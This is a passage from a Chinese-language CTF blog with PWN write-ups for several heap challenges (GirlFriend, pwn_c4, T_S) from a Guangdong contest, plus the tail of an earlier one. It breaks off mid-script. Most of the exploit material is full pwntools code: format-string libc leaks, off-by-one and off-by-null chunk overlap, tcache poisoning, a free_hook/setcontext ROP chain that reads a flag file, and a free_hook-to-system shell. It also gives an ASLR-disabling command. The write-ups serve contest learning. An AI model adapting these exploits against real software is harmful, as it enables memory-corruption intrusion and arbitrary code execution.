class="hljs-comment"># gdb.attach(p)</span><br>add(<span class="hljs-number">0x100</span>)  <span class="hljs-comment">#0</span><br><br>add(<span class="hljs-number">0x100</span>)  <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &amp; <span class="hljs-number">0xfffffffff000</span><br>success(<span class="hljs-string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(heap_base)))<br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    free(<span class="hljs-number">1</span>)<br>    edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>rtld_global = libc_base + <span class="hljs-number">0x237f68</span><br>golbal_max_fast = libc_base + <span class="hljs-number">0x1eeb80</span><br>gadget = [<span class="hljs-number">0xe6c7e</span>, <span class="hljs-number">0xe6c81</span>, <span class="hljs-number">0xe6c84</span>]<br>one_gadget = libc_base + gadget[<span class="hljs-number">0</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">0x100</span>)  <span class="hljs-comment">#2</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):  <span class="hljs-comment">#3-8</span><br>    add(<span class="hljs-number">0x88</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):  <span class="hljs-comment">#3-8</span><br>    free(<span class="hljs-number">3</span>+i)<br><br>add(<span class="hljs-number">0x200</span>)          <span class="hljs-comment">#9</span><br>add(<span class="hljs-number">0x68</span>)           <span class="hljs-comment">#10</span><br>add(<span class="hljs-number">0x200</span>)          <span class="hljs-comment">#11</span><br>add(<span class="hljs-number">0x200</span>)          <span class="hljs-comment">#12</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(<span class="hljs-number">12</span>)<br>    edit(<span class="hljs-number">12</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">9</span>)<br>add(<span class="hljs-number">0x170</span>)          <span class="hljs-comment">#13</span><br>free(<span class="hljs-number">11</span>)<br>add(<span class="hljs-number">0x170</span>)          <span class="hljs-comment">#14</span><br>add(<span class="hljs-number">0x200</span>)          <span class="hljs-comment">#15</span><br>edit(<span class="hljs-number">11</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x178</span> + p64(<span class="hljs-number">0x91</span>) + p64(heap_base+<span class="hljs-number">0x990</span>) + p64(golbal_max_fast-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x88</span>)           <span class="hljs-comment">#16</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(<span class="hljs-number">10</span>)<br>    edit(<span class="hljs-number">10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">10</span>)<br>edit(<span class="hljs-number">10</span>, p64(malloc_hook-<span class="hljs-number">0x33</span>))<br>add(<span class="hljs-number">0x68</span>)           <span class="hljs-comment">#17</span><br>add(<span class="hljs-number">0x68</span>)           <span class="hljs-comment">#18</span><br>edit(<span class="hljs-number">18</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x1b</span> + p64(one_gadget) + p64(realloc))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x10</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="darkdark"><a href="#darkdark" class="headerlink" title="darkdark"></a>darkdark</h2><p>不会ret2dlresolve，使用pwntools的模板打了几发，应该是姿势不对，告辞！！！</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>orw</tag>
      
      <tag>Tcache Stashing Unlink Attack</tag>
      
      <tag>tcache struct劫持</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>广东省强网杯团队赛PWN方向题解</title>
    <link href="/2021/10/14/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9BPWN/"/>
    <url>/2021/10/14/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9BPWN/</url>
    
    <content type="html"><![CDATA[<p>比赛只出了一道pwn，摸了。<a href="https://pan.baidu.com/s/1Tn7DffidoxqQ3mqQtZntXQ">题目链接</a>，提取码：hi98</p><h2 id="GirlFriend"><a href="#GirlFriend" class="headerlink" title="GirlFriend"></a>GirlFriend</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>ida打开文件后发现函数体内啥也没有。</p><p><img src="https://i.loli.net/2021/10/14/PWj4pbmZrocFEOK.png"></p><p>汇编中有call $+5这样一条指令，类似于重定位，这对我们来说肯定是干扰，我们需要patch修复一下。</p><p><img src="https://i.loli.net/2021/10/14/lNi7AC2HdQOmRf9.png"></p><p>修复方法参考如下</p><p><img src="https://i.loli.net/2021/10/14/NtYoklu962zjMGw.png"></p><p>就是把call $+5全都改成<code>jmp</code> 【下条指令地址加上其偏移】，修复后就可以看见函数代码了，程序中有很多需要修复的地方，同样的方法改一下就好。</p><p><img src="https://i.loli.net/2021/10/14/ZgnxuRowFL3ypKr.png"></p><p>全都修复好就可以正式分析了，程序逻辑很简单，漏洞点主要有两处，格式化字符串和off by one，当然还有个隐藏的后门功能，可以泄露堆地址。</p><p><img src="https://i.loli.net/2021/10/14/sEaVH93Sz52jdpQ.png"></p><p><img src="https://i.loli.net/2021/10/14/MbOCHePpDTVtUkr.png"></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>我遇到的格式化字符串在堆题中大部分作用就是辅助泄露<code>libc</code>，同样这里我们也可以用来泄露<code>libc</code>。</p><p>程序开了沙箱，只能<code>orw</code>了，经典利用free_hook+setcontext来读取flag</p><h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p><strong>libc泄露</strong></p><p>常规泄露的话就是用%p来打印栈中数据，还可以用<code>%7$p</code>指定参数位置，但程序开了<code>FORTIFY</code>防护，不能跳跃使用%N$这种格式的输入。也就是说如果要使用 <code>%3$p</code>，则必须同时使用 <code>%1$p</code> 和 <code>%2$p</code></p><p><img src="https://i.loli.net/2021/10/14/2sMq8DTk5z4Saob.png"></p><p>于是去搜索了一下printf_chk格式化字符串相关的利用方法，发现还有<code>%a</code>泄露libc的方法（第一次见）。</p><p>但他的输出格式有点特别，需要匹配一下再接收，下个断点gdb动态调一下就可以得到libc基址了。</p><p><img src="https://i.loli.net/2021/10/14/m6Dzep8NMEvKlBY.png"></p><p><strong>堆地址泄露</strong></p><p>这个直接调用程序中的后门函数即可</p><p><strong><code>offbyone</code>构造<code>overlap chunk</code></strong></p><p>主要时间花费在这部分，程序实际的功能只有一个，但这个功能是用<code>realloc</code>实现的，为什么不用<code>malloc</code>要用<code>realloc</code>，肯定有点猫腻。</p><p>他的基础功能是改变<code>mem_ptr</code>所指内存区域的大小为<code>new_size</code>长度。这里有几种不同的情况</p><ol><li>当size为0，这时就相当于free()函数，同时返回值为null</li><li>当指针为0，size大于0，相当于malloc函数</li><li>size小于等于原来的size，则在原先的基础上缩小，多余的free掉</li><li>size大于原来的size，如果有空间就原基础扩充，空间不足则分配新的内存，将内容复制到新的内存中，然后再将原来的内存free掉</li></ol><p><code>off by one</code>，常见的手法就是改堆块的size构造出堆块重叠了。</p><p>布局也不是很复杂，如下即可，通过编辑<code>chunk0</code>溢出到<code>chunk1</code>的size位，将<code>chunk1</code>的size改成<code>chunk1</code>+<code>chunk2</code>的size总和。为了方便起见，我是选择了让<code>chunk1</code>的size为<code>0x101</code>，<code>chunk2</code>的size为<code>0xAA</code>，这样的话，只需将<code>chunk1</code>的size低位字节改成<code>chunk2</code>的size大小即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x300</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x230</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x138</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>re(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/R1k4vdliZqePLNM.png"></p><p><img src="https://i.loli.net/2021/10/14/gAr4td3YxjERH5q.png"></p><p>再申请一个<code>0x138</code>大小的chunk就可以拿到<code>chunk0</code>了，进而修改<code>chunk1</code>的size</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x138</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x138</span> + <span class="hljs-string">&#x27;\xd0&#x27;</span>)<br>re(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/EXNfeFn3oLibRJP.png"></p><p>这时候再把<code>chunk1</code>申请过来然后释放掉，<code>chunk1</code>就进入<code>0x1d0</code>的<code>tcache bin</code>里了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xf0</span>, <span class="hljs-string">&#x27;bbb&#x27;</span>)<br>re(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/QT51Zur9KAocb4V.png"></p><p>那么接下来把这个<code>0x1d0</code>的<code>overlaped chunk</code>申请下来就可以修改<code>chunk2</code>的<code>fd</code>了</p><p>后面的操作也都是模板了，不多赘述</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./girlfriend&#x27;</span><br>elf = ELF(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;123.60.63.90&#x27;</span>, <span class="hljs-number">49156</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size, content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-comment"># pause()</span><br>p.sendlineafter(<span class="hljs-string">&#x27;size\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>p.sendafter(<span class="hljs-string">&#x27;data\n&#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">re</span>(<span class="hljs-params">size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;size\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exit</span>():</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>gdb.attach(p)<span class="hljs-comment">#, &#x27;b *$rebase(0xf1c)&#x27;)</span><br>p.sendlineafter(<span class="hljs-string">&#x27;? \n\n\n&#x27;</span>, <span class="hljs-string">&#x27;78&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;reason\n&#x27;</span>, <span class="hljs-string">&#x27;%a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;0x0.0&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recvline()[:<span class="hljs-number">12</span>], <span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="hljs-number">131</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">0x35</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>exit()<br><br>p.sendlineafter(<span class="hljs-string">&#x27;? \n\n\n&#x27;</span>, <span class="hljs-string">&#x27;89&#x27;</span>)<br>add(<span class="hljs-number">0x300</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>show()<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(heap_base)))<br>flag_path = heap_base + <span class="hljs-number">0x1d8</span><br>add(<span class="hljs-number">0x230</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x138</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>re(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x138</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x138</span> + <span class="hljs-string">&#x27;\xd0&#x27;</span>)<br>re(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0xf0</span>, <span class="hljs-string">&#x27;bbb&#x27;</span>)<br>re(<span class="hljs-number">0</span>)<br><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x215bf</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x23eea</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x1b96</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x43ae8</span><br>ret = libc_base + <span class="hljs-number">0x8aa</span><br>Read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>Write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>syscall = Read + <span class="hljs-number">15</span><br><br>orw = p64(pop_rdi_ret) + p64(flag_path)<br>orw += p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>)<br>orw += p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>)<br>orw += p64(syscall)<br>orw += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>)<br>orw += p64(pop_rsi_ret) + p64(flag_path)<br>orw += p64(pop_rdx_ret) + p64(<span class="hljs-number">0x41</span>)<br>orw += p64(Read)<br>orw += p64(pop_rdi_ret) + p64(<span class="hljs-number">1</span>)<br>orw += p64(Write)<br>payload = orw + <span class="hljs-string">&#x27;./flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + payload<br><br>add(<span class="hljs-number">0x1c0</span>, payload.ljust(<span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0xb1</span>) + p64(free_hook))<br>re(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0xc0</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>re(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0xc0</span>, p64(setcontext).ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">&#x27;a&#x27;</span>) + p64(heap_base+<span class="hljs-number">0x150</span>) + p64(ret))<br><span class="hljs-comment"># pause()</span><br>re(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwn-c4"><a href="#pwn-c4" class="headerlink" title="pwn_c4"></a>pwn_c4</h2><p>这个题ida一打开就有关掉的冲动，完全逆不动。但结合题目的描述：编辑器/uaf</p><p>猜测这个题实现了一个小型的C语言编译器，可以编译我们输入的C语言代码，同时可以从ida中看到如下的字符串，应该就是提示我们可以用以下关键字。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">buf = <span class="hljs-string">&quot;char else enum if int return sizeof while open read close printf malloc free memset memcmp exit void main&quot;</span>;<br></code></pre></td></tr></table></figure><p>google搜索pwn c4可以也可以搜到历史有相关的考点。</p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/10/boom/">https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/10/boom/</a></p><p><img src="https://i.loli.net/2021/10/14/IsLh2SNnEC7kK5F.png"></p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>通过执行C语言代码拿到程序shell</p><h3 id="调试过程-1"><a href="#调试过程-1" class="headerlink" title="调试过程"></a>调试过程</h3><p>先写个程序试试怎么用，经典<code>hello world!</code>，发现确实有输出。</p><p><img src="https://i.loli.net/2021/10/14/6XpFoTbgJ3VweSN.png"></p><p>再来个打印堆地址看看，我申请了一个块超级大的堆块，使用mmap系统调用，地址应该是跟libc接近，也同样可以打印出来，这也就验证了我们前面的猜想。</p><p><img src="https://i.loli.net/2021/10/14/xpZzTngEqSR6m75.png"></p><p>接下来就是写程序拿shell了，libc可以通过计算那个mmap出来的堆地址之间的偏移来获得，打远程的话就加载远程的使用的那个libc计算这个偏移。</p><p><img src="https://i.loli.net/2021/10/14/oMgAeNlhIBQ1rKR.png"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>binary = <span class="hljs-string">&#x27;./c4&#x27;</span><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>libc = ELF(libc-<span class="hljs-number">2.27</span>.so)<br>p = remote(<span class="hljs-string">&#x27;&#x27;</span>)<br>elf = ELF(binary)<br><br><span class="hljs-comment"># gdb.attach(p, &#x27;b exit&#x27;)</span><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">void main()</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">int libc_base, system, free_hook;</span><br><span class="hljs-string">libc_base = (int)malloc(0x21000) - 0x498010;</span><br><span class="hljs-string">printf(&quot;libc_base -&gt; %p&quot;, libc_base);</span><br><span class="hljs-string">system = libc_base + 0x4f550;</span><br><span class="hljs-string">free_hook = libc_base + 0x3ed8e8;</span><br><span class="hljs-string">*(int*)free_hook = system;</span><br><span class="hljs-string">free(&quot;/bin/sh&quot;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="T-S"><a href="#T-S" class="headerlink" title="T_S"></a>T_S</h2><p>比赛的时候就载在这里了，做题太心急了，没仔细观察，导致看了半天都没找到漏洞点在哪，这个题的edit函数也用重定位藏了一段代码，把<code>call $+5</code>修复一下就好。害，阴间出题人。</p><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>修复后的的代码如下</p><p><img src="https://i.loli.net/2021/10/14/wFrHesgNYiGnD4t.png"></p><p>中间那个三层for循环也是个唬人的阴间操作，两两交换又还原，相当于啥也没干。重点是最后一个循环，遍历堆块的每一个字节，判断是否等于1，如果所有字节都等于1最后就有一个赋0操作，也就是<code>off by null</code>。撒花，直接套模板。</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>利用off by null漏洞构造出overlap chunk，libc 2.29以上利用off by null需要绕过两个check，一个是向低地址合并的检测：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br></code></pre></td></tr></table></figure><p>另一个是unlink的检测</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br>    malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br></code></pre></td></tr></table></figure><p>prevsize是我们控制的，很好伪造，重点是绕过unlink的检查，程序有show功能，可以直接泄露堆地址，也就很容易绕过unlink的检测构造出overlapped chunk。</p><p>有了重叠的堆块就可以很愉快的操作了，通过unsorted bin的地址踩出_IO_2_1_stdout进而泄露libc，再就是改free_hook了。</p><h3 id="调试过程-2"><a href="#调试过程-2" class="headerlink" title="调试过程"></a>调试过程</h3><p><strong>泄露堆地址</strong></p><p>申请两个同样大小的堆块，再free掉，形成单链表，申请一个回来再show一下就可以拿到堆地址了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>show(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/z2oBig9vuIFfXCt.png"></p><p><strong>off by null</strong></p><p>堆块布局如下，三个连续的chunk，这里的0，1，2并不与后面的exp堆块编号对应，只是简化描述而已。</p><p><img src="https://i.loli.net/2021/10/14/o5tbqaeNPjhDWlu.png"></p><p>上述布局有几个注意点的，为了绕过第一个检测，我们需要让pre_size等于chunk_size，chunk的size我们不好实际控制，所以再chunk0中构造一个fake_chunk，让这个fake_chunk的fake_size等于<code>chunk0_size+chunk1_size-0x10</code>。为了绕过第二个检测，需要让fake_fd和fake_bk指向它自己。并且同过off by null漏洞把chunk2的prev_inuse位置为0。</p><p>这些操作完成了，再free chunk2的时候，glibc就会根据prev_size找到fake_chunk，再进行unlink脱链操作。</p><p>下面为exp的chunk编号，0，1用来泄露堆地址了，与上述编号有出入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pyton">add(0x100)  #2 工具堆块 伪造fake_chunk<br>add(0x78)   #3 工具堆块 用来修改chunk4的prev_size和触发off by null漏洞<br>add(0x4f0)  #4 工具堆块，为了让chunk进入unsorted bin<br>add(0x100)  #5 避免top_chunk合并<br>add(0x78)   #6 工具堆块 让tcahe bin链表的数量为正<br><br>edit(2, p64(0)+p64(0x100+0x81)+p64(heap_base+0x2e0)*2)<br>edit(3, &#x27;\x01&#x27;*0x78)<br>edit(3, b&#x27;a&#x27;*0x70 + p64(0x180))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/eJlIE98AGwD1doa.png"></p><p>然后把chunk4给free掉，就触发合并了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/xS8QYkszZ3GMjIU.png"></p><p><strong>泄露libc</strong></p><p>通过切割unsorted bin，把unsorted bin的地址链到tcache上，爆破一位，把unsorted bin的地址改成__IO_2_1_stdout_的地址。</p><p>为了调试方便可以关掉本地的地址随机化<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0xf0</span>)   <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x10</span>)   <span 